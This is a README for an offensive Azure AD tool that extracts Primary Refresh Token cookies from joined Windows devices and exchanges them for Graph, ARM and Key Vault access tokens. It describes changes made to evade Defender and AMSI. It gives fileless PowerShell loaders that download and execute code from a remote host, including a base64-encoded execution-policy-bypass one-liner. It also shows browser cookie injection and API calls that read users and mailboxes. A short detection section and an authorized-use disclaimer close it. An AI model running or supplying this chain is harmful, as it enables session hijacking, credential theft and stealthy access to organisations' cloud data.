# RequestAADRefreshToken2

A patched and extended C# implementation of [Lee Christensen's RequestAADRefreshToken](https://github.com/leechristensen/RequestAADRefreshToken), updated for modern Azure AD authentication requirements.

Requests a PRT cookie from an Azure AD joined device by calling the `IProofOfPossessionCookieInfoManager` COM interface directly inside `MicrosoftAccountTokenProvider.dll` the same mechanism used by Chrome and Edge for browser SSO.

---

## Background

The original tool was published in July 2020 and stopped working for token exchange after Microsoft enforced a nonce requirement in October 2020. Cookies without an embedded `request_nonce` are rejected by the AAD token endpoint. This version fixes that and adds several improvements.

---

## Changes Over the Original

| # | Issue | Fix |
| --- | --- | --- |
| 1 | CLSID stored as string in metadata caught by Defender | CLSID reconstructed from integer literals at runtime via `Type.GetTypeFromCLSID()` |
| 2 | Identifying namespace and class names in metadata flagged by AMSI | All names replaced with generic alternatives |
| 3 | Stride bug in unmanaged array walk wrong struct size corrupts pointer on multi-cookie responses | Fixed to use unmanaged struct size for pointer arithmetic |
| 4 | No nonce support cookie uses `iat` timestamp, rejected by AAD since Oct 2020 | Nonce accepted via `--nonce` flag or auto-fetched from AAD |

---

## Requirements

* Windows 10 / 11
* .NET Framework 4.7+ or .NET 6+
* Must run in the context of an Azure AD user on an **Azure AD joined** or **Hybrid joined** device
* `AzureAdPrt: YES` in `dsregcmd /status`

---

## Usage

```
RequestAADRefreshToken2.exe [options] [url]
```

### Options

| Flag | Description |
| --- | --- |
| `--nonce`, `-n <value>` | Use a specific nonce obtained externally |
| `--tenant`, `-t <value>` | Tenant ID or domain for nonce auto-fetch (default: `common`) |
| `-legacy` | No nonce uses `iat` timestamp (broken since Oct 2020, warns) |
| `--help`, `-h` | Show usage |

### Modes

**Default: auto-fetch nonce (recommended)**

```
RequestAADRefreshToken2.exe
```

Fetches a fresh nonce from AAD automatically using `POST /oauth2/token` with `grant_type=srv_challenge`, then requests the PRT cookie. No external tools required.

**With tenant ID**

```
RequestAADRefreshToken2.exe -t yourtenant.onmicrosoft.com
```

**Manual nonce from roadrecon**

```
roadrecon auth --prt-init -t <TenantId>
RequestAADRefreshToken2.exe --nonce AQABAAAAAAD...
```

**Full URL (PulseSecurity technique)**

```
RequestAADRefreshToken2.exe "https://login.microsoftonline.com/...&sso_nonce=AQAB..."
```

**Legacy mode**

```
RequestAADRefreshToken2.exe -legacy
```

---

## Example Output

<img width="1581" height="951" alt="image" src="https://github.com/user-attachments/assets/fad177c1-6fa7-47fc-b359-f295bb8e5894" />

---

## Using the Cookie

### Browser SSO Injection (Chrome)

1. Open Chrome DevTools (`F12`) on `https://login.microsoftonline.com`
2. Go to `Application > Cookies > https://login.microsoftonline.com`
3. Delete all existing cookies
4. Add a new cookie:
   * **Name:** `x-ms-RefreshTokenCredential`
   * **Value:** the `Data` field from the output
5. Refresh the page
   
<img width="1812" height="932" alt="image" src="https://github.com/user-attachments/assets/dc04fbad-53a5-4766-87c1-d0482f2ecc37" />

### Token Exchange via roadtx

```
roadtx auth --prt-cookie <DATA> -t <TenantId> -r msgraph
```

### Token Exchange : No External Dependencies

Use [Get-PRTToken.ps1](https://gist.github.com/Abdelhadi963/8a7be60ffa9ed2fd500292e134597430) to exchange the cookie for an MS Graph access token and connect without roadtx:

```
.\Get-PRTToken.ps1 -PrtCookie "<DATA>" -TenantId "<TenantId>"
```

---

## PowerPrt.ps1 : Fileless All-in-One Module

`PowerPrt.ps1` is a self-contained PowerShell module that performs the full PRT abuse chain without dropping `RequestAADRefreshToken2.exe` to disk. The compiled DLL is embedded as base64 and loaded reflectively into memory via `Assembly.Load()`.

### How It Works

```
IEX (load PowerPrt.ps1)
  -> Assembly.Load(base64 DLL) into isolated AppDomain
    -> COM CoCreateInstance -> AAD broker -> PRT cookie extracted
      -> POST /oauth2/authorize with cookie -> auth code
        -> POST /oauth2/token -> access token
```

### Load

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<host>/PowerPrt.ps1')
# or
IEX (iwr http://<host>/PowerPrt.ps1 -UseBasicParsing)
```

### Functions

#### `Get-PRTCookie` : Cookie extraction only

```powershell
# auto nonce (default)
$c = Get-PRTCookie

# custom tenant for nonce fetch
$c = Get-PRTCookie -Tenant "contoso.onmicrosoft.com"

# manual nonce
$c = Get-PRTCookie -Nonce "AQABAAAAAAD..."

# legacy mode (no nonce, likely rejected by AAD)
$c = Get-PRTCookie -Legacy
```

#### `Invoke-PRTTokenExchange` : Token exchange from existing cookie

```powershell
# MS Graph (default)
Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com"

# Azure Resource Manager
Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource azurerm

# AAD Graph
Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource aadgraph

# Key Vault
Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource keyvault

# Custom resource URL
Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource "https://storage.azure.com/"
```

Tokens are saved to `$global:accessToken`, `$global:refreshToken`, `$global:expiresOn` after successful exchange.

#### `Invoke-PRTChain` : Full chain in one call

```powershell
# full chain, MS Graph
Invoke-PRTChain -TenantId "contoso.onmicrosoft.com"

# full chain, different resource
Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Resource azurerm

# full chain, manual nonce
Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Nonce "AQABAAAAAAD..."

# full chain, legacy cookie
Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Legacy
```

### Using the Access Token

No Graph module required hit the API directly:

```powershell
$headers = @{ Authorization = "Bearer $global:accessToken" }

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=5" -Headers $headers
```

### Resource Aliases

| Alias | Resource URL |
| --- | --- |
| `msgraph` | `https://graph.microsoft.com/` |
| `aadgraph` | `https://graph.windows.net/` |
| `azurerm` | `https://management.azure.com/` |
| `keyvault` | `https://vault.azure.net/` |

### Powershell One liner 

```powershell
# one shot
IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId "5f63d0b6-a17c-447b-bdfe-db9e2475497b"
# Or Base64 it
powershell -ep bypass -e SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAzAC4AMQAvAFAAbwB3AGUAcgBQAHIAdAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApADsAIABJAG4AdgBvAGsAZQAtAFAAUgBUAEMAaABhAGkAbgAgAC0AVABlAG4AYQBuAHQASQBkACAAIgA1AGYANgAzAGQAMABiADYALQBhADEANwBjAC0ANAA0ADcAYgAtAGIAZABmAGUALQBkAGIAOQBlADIANAA3ADUANAA5ADcAYgAiAA==
```

<img width="1918" height="993" alt="image" src="https://github.com/user-attachments/assets/98f471c2-39ba-43fd-ac6a-b193d68a8dd0" />

---

## Detection

When this tool executes, `MicrosoftAccountTokenProvider.dll` is loaded into the calling process. Defenders can baseline which processes normally load this DLL and alert on anomalies.

ETW provider `{05f02597-fe85-4e67-8542-69567ab8fd4f}` emits telemetry on `GetCookieInfoForUri` calls and can be monitored via process-level ETW tracing.

---

## Prerequisites Check

```
dsregcmd /status
```

Look for:

```
AzureAdJoined : YES
AzureAdPrt    : YES
```

If `AzureAdPrt` is `NO`, the user has not signed in with an Azure AD account on this device and no PRT is available.

---

## Related Tools

| Tool | Description |
| --- | --- |
| [RequestAADRefreshToken](https://github.com/leechristensen/RequestAADRefreshToken) | Original C# tool by Lee Christensen |
| [aad\_prt\_bof](https://github.com/wotwot563/aad_prt_bof) | BOF port for in-process execution via C2 |
| [ROADtools / roadtx](https://github.com/dirkjanm/ROADtools) | Token manipulation and tenant enumeration |
| [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) | AAD join state and WAM account enumeration BOFs |

---

## References

* [Microsoft Docs - Primary Refresh Token](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
* [Dirk-jan Mollema - Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [SpecterOps - Requesting Azure AD Tokens for Browser SSO](https://specterops.io/blog/2020/07/14/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso/)
* [SpecterOps - An Operator's Guide to Device-Joined Hosts and the PRT Cookie](https://specterops.io/blog/2025/04/07/an-operators-guide-to-device-joined-hosts-and-the-prt-cookie/)
* [PulseSecurity - Primary Refresh Token Exploitation](https://pulsesecurity.co.nz/articles/exploiting-entraid-prt)

---

## Disclaimer

This tool is intended for authorized red team operations and security research only. Use only on systems you have explicit permission to test.
